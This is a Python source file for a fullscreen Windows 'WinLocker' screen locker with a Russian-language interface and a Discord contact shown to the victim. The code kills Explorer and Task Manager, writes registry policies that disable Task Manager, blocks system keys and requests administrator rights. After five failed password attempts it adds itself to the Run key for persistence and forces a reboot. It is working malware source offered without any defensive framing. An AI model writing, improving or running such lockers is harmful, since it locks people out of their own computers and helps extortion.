# -*- coding: utf-8 -*-
"""
Fullscreen WinLocker - ON-SCREEN KEYBOARD (English)
Contact: mrgrishast_51442
Password: qwe123A
"""

import tkinter as tk
from tkinter import messagebox
import ctypes
import os
import sys
import threading
import socket

# ==================== КОНФИГ ====================
PASSWORD = "qwe123A"
BACKUP_PASSWORDS = ["grifers", "xworm", "admin123", "unlock"]
DISCORD_CONTACT = "mrgrishast_51442"
CODE = "1337"
MAX_ATTEMPTS = 5

class FullscreenWinLocker:
    def __init__(self):
        self.attempts = 0
        self.root = None
        self.entry = None
        self.attempts_label = None
        self.keyboard_frame = None
        self.caps_on = False
        self.shift_on = False
        
        self.pc_name = socket.gethostname()
        
        self.create_gui()
        
    def lock_system(self):
        """Блокировка системы"""
        try:
            os.system("taskkill /f /im explorer.exe >nul 2>&1")
            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
            os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1')
            os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1')
        except:
            pass
            
    def unlock_system(self):
        """Разблокировка"""
        try:
            os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f >nul 2>&1')
            os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoClose /f >nul 2>&1')
            os.system("start explorer.exe")
        except:
            pass
        
    def punish(self):
        """Наказание"""
        try:
            exe_path = sys.executable.replace('\\', '\\\\')
            os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WinLocker /t REG_SZ /d "{exe_path}" /f >nul 2>&1')
        except:
            pass
        os.system("shutdown /r /t 3 /f")
        
    def create_gui(self):
        """Создание полноэкранного GUI с экранной клавиатурой"""
        self.root = tk.Tk()
        self.root.title("Windows заблокирован")
        
        try:
            screen_width = self.root.winfo_screenwidth()
            screen_height = self.root.winfo_screenheight()
        except:
            screen_width = 1920
            screen_height = 1080
            
        self.root.geometry(f"{screen_width}x{screen_height}+0+0")
        self.root.configure(bg='#000000')
        
        try:
            self.root.overrideredirect(True)
            self.root.attributes('-topmost', True)
            self.root.attributes('-fullscreen', True)
        except:
            pass
        
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Блокировка физических клавиш
        def block_keys_thread():
            try:
                import keyboard
                blocked = ['ctrl', 'win', 'windows', 'esc', 'f4', 'delete', 'tab', 'alt', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']
                for key in blocked:
                    try:
                        keyboard.block_key(key)
                    except:
                        pass
            except:
                pass
                
        threading.Thread(target=block_keys_thread, daemon=True).start()
        
        # ==================== ИНТЕРФЕЙС ====================
        
        # Верхняя часть (компактная)
        top_frame = tk.Frame(self.root, bg='#000000')
        top_frame.pack(pady=20)
        
        title = tk.Label(top_frame, text="⚠ WINDOWS ЗАБЛОКИРОВАН ⚠",
                        font=('Arial', 24, 'bold'), fg='#ff0000', bg='#000000')
        title.pack()
        
        tk.Label(top_frame, text=f"Discord: {DISCORD_CONTACT} | Код: {CODE}",
                font=('Arial', 14), fg='#00ff88', bg='#000000').pack(pady=5)
        
        # Средняя часть
        mid_frame = tk.Frame(self.root, bg='#000000')
        mid_frame.pack(expand=True)
        
        # Поле ввода
        pass_frame = tk.Frame(mid_frame, bg='#000000')
        pass_frame.pack(pady=10)
        
        tk.Label(pass_frame, text="ПАРОЛЬ:", font=('Arial', 16, 'bold'),
                fg='#00ff88', bg='#000000').pack(side=tk.LEFT, padx=10)
        
        self.entry = tk.Entry(pass_frame, font=('Arial', 18), show="●",
                              bg='#1a1a1a', fg='#00ff88', width=25,
                              insertbackground='#00ff88', relief=tk.FLAT,
                              justify='center')
        self.entry.pack(side=tk.LEFT, padx=10, ipady=8)
        self.entry.focus()
        
        # Кнопки управления
        btn_frame = tk.Frame(mid_frame, bg='#000000')
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="←", font=('Arial', 14), bg='#333333', fg='#ffffff',
                 width=4, command=self.backspace).pack(side=tk.LEFT, padx=2)
        
        tk.Button(btn_frame, text="ОЧИСТИТЬ", font=('Arial', 12), bg='#333333', fg='#ffffff',
                 width=10, command=self.clear_entry).pack(side=tk.LEFT, padx=2)
        
        # Caps Lock индикатор
        self.caps_label = tk.Label(btn_frame, text="CAPS: OFF", font=('Arial', 10),
                                   fg='#888888', bg='#000000')
        self.caps_label.pack(side=tk.LEFT, padx=20)
        
        self.shift_label = tk.Label(btn_frame, text="SHIFT: OFF", font=('Arial', 10),
                                    fg='#888888', bg='#000000')
        self.shift_label.pack(side=tk.LEFT, padx=10)
        
        # ==================== ЭКРАННАЯ КЛАВИАТУРА ====================
        self.keyboard_frame = tk.Frame(mid_frame, bg='#000000')
        self.keyboard_frame.pack(pady=20)
        
        self.create_keyboard()
        
        # Нижняя часть
        bottom_frame = tk.Frame(self.root, bg='#000000')
        bottom_frame.pack(side=tk.BOTTOM, pady=20)
        
        self.attempts_label = tk.Label(bottom_frame,
                                       text=f"Осталось попыток: {MAX_ATTEMPTS}",
                                       font=('Arial', 14), fg='#ffaa00', bg='#000000')
        self.attempts_label.pack()
        
        tk.Button(bottom_frame, text="РАЗБЛОКИРОВАТЬ",
                 font=('Arial', 14, 'bold'),
                 bg='#cc0000', fg='#ffffff', relief=tk.FLAT,
                 padx=40, pady=10, command=self.check_password,
                 cursor='hand2').pack(pady=10)
        
        tk.Label(bottom_frame, text="⚠ Попытки обмануть систему могут нанести вред вашему компьютеру!",
                font=('Arial', 10, 'bold'), fg='#ff0000', bg='#000000').pack()
        
        self.root.after(500, self.lock_system)
        self.root.mainloop()
        
    def create_keyboard(self):
        """Создание экранной клавиатуры (только английские буквы)"""
        # Цифровой ряд
        row1_keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
        # Верхний буквенный ряд
        row2_keys = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p']
        # Средний буквенный ряд
        row3_keys = ['a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l']
        # Нижний буквенный ряд
        row4_keys = ['z', 'x', 'c', 'v', 'b', 'n', 'm']
        
        # Очищаем старую клавиатуру
        for widget in self.keyboard_frame.winfo_children():
            widget.destroy()
        
        # Определяем регистр
        if self.caps_on != self.shift_on:
            row2_keys = [k.upper() for k in row2_keys]
            row3_keys = [k.upper() for k in row3_keys]
            row4_keys = [k.upper() for k in row4_keys]
        
        # Кнопки специальных символов
        special_row = tk.Frame(self.keyboard_frame, bg='#000000')
        special_row.pack(pady=2)
        
        for char in row1_keys:
            btn = tk.Button(special_row, text=char, font=('Arial', 14, 'bold'),
                           bg='#333333', fg='#ffffff', width=4, height=2,
                           command=lambda c=char: self.type_char(c))
            btn.pack(side=tk.LEFT, padx=2)
        
        # Ряд 2
        row2 = tk.Frame(self.keyboard_frame, bg='#000000')
        row2.pack(pady=2)
        for char in row2_keys:
            btn = tk.Button(row2, text=char, font=('Arial', 14, 'bold'),
                           bg='#333333', fg='#ffffff', width=4, height=2,
                           command=lambda c=char: self.type_char(c))
            btn.pack(side=tk.LEFT, padx=2)
        
        # Ряд 3
        row3 = tk.Frame(self.keyboard_frame, bg='#000000')
        row3.pack(pady=2)
        for char in row3_keys:
            btn = tk.Button(row3, text=char, font=('Arial', 14, 'bold'),
                           bg='#333333', fg='#ffffff', width=4, height=2,
                           command=lambda c=char: self.type_char(c))
            btn.pack(side=tk.LEFT, padx=2)
        
        # Ряд 4
        row4 = tk.Frame(self.keyboard_frame, bg='#000000')
        row4.pack(pady=2)
        
        # Shift кнопка
        shift_btn = tk.Button(row4, text="SHIFT", font=('Arial', 10, 'bold'),
                             bg='#555555' if self.shift_on else '#333333',
                             fg='#ffffff', width=6, height=2,
                             command=self.toggle_shift)
        shift_btn.pack(side=tk.LEFT, padx=2)
        
        for char in row4_keys:
            btn = tk.Button(row4, text=char, font=('Arial', 14, 'bold'),
                           bg='#333333', fg='#ffffff', width=4, height=2,
                           command=lambda c=char: self.type_char(c))
            btn.pack(side=tk.LEFT, padx=2)
        
        # Caps Lock кнопка
        caps_btn = tk.Button(row4, text="CAPS", font=('Arial', 10, 'bold'),
                            bg='#555555' if self.caps_on else '#333333',
                            fg='#ffffff', width=6, height=2,
                            command=self.toggle_caps)
        caps_btn.pack(side=tk.LEFT, padx=2)
        
        # Пробел и Backspace
        bottom_row = tk.Frame(self.keyboard_frame, bg='#000000')
        bottom_row.pack(pady=5)
        
        tk.Button(bottom_row, text="ПРОБЕЛ", font=('Arial', 12),
                 bg='#333333', fg='#ffffff', width=20, height=2,
                 command=lambda: self.type_char(' ')).pack(side=tk.LEFT, padx=2)
        
        tk.Button(bottom_row, text="BACKSPACE", font=('Arial', 12),
                 bg='#333333', fg='#ffffff', width=12, height=2,
                 command=self.backspace).pack(side=tk.LEFT, padx=2)
        
    def toggle_shift(self):
        """Переключение Shift"""
        self.shift_on = not self.shift_on
        self.shift_label.config(text=f"SHIFT: {'ON' if self.shift_on else 'OFF'}",
                               fg='#00ff88' if self.shift_on else '#888888')
        self.create_keyboard()
        
    def toggle_caps(self):
        """Переключение Caps Lock"""
        self.caps_on = not self.caps_on
        self.caps_label.config(text=f"CAPS: {'ON' if self.caps_on else 'OFF'}",
                              fg='#00ff88' if self.caps_on else '#888888')
        self.create_keyboard()
        
    def type_char(self, char):
        """Ввод символа"""
        current = self.entry.get()
        self.entry.delete(0, tk.END)
        self.entry.insert(0, current + char)
        
        # Если Shift был включен - выключаем
        if self.shift_on:
            self.shift_on = False
            self.shift_label.config(text="SHIFT: OFF", fg='#888888')
            self.create_keyboard()
        
    def backspace(self):
        """Удаление последнего символа"""
        current = self.entry.get()
        self.entry.delete(0, tk.END)
        self.entry.insert(0, current[:-1])
        
    def clear_entry(self):
        """Очистка поля ввода"""
        self.entry.delete(0, tk.END)
        
    def check_password(self):
        """Проверка пароля"""
        password = self.entry.get()
        
        if password == PASSWORD or password in BACKUP_PASSWORDS:
            messagebox.showinfo("УСПЕШНО", "✅ Доступ разрешён!\nСистема разблокирована.")
            self.unlock_system()
            self.root.destroy()
            return
            
        self.attempts += 1
        remaining = MAX_ATTEMPTS - self.attempts
        
        self.attempts_label.config(text=f"Осталось попыток: {remaining}")
        self.clear_entry()
        
        if self.attempts >= MAX_ATTEMPTS:
            messagebox.showerror("ОШИБКА", "💀 Превышен лимит попыток!\nСистема будет уничтожена...")
            self.punish()
            self.root.destroy()
        else:
            messagebox.showerror("НЕВЕРНЫЙ ПАРОЛЬ", 
                                f"❌ Неверный пароль!\nОсталось {remaining} попыток.")

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit()
    except:
        pass
    
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "WinLocker_Keyboard_Mutex")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except:
        pass
        
    FullscreenWinLocker()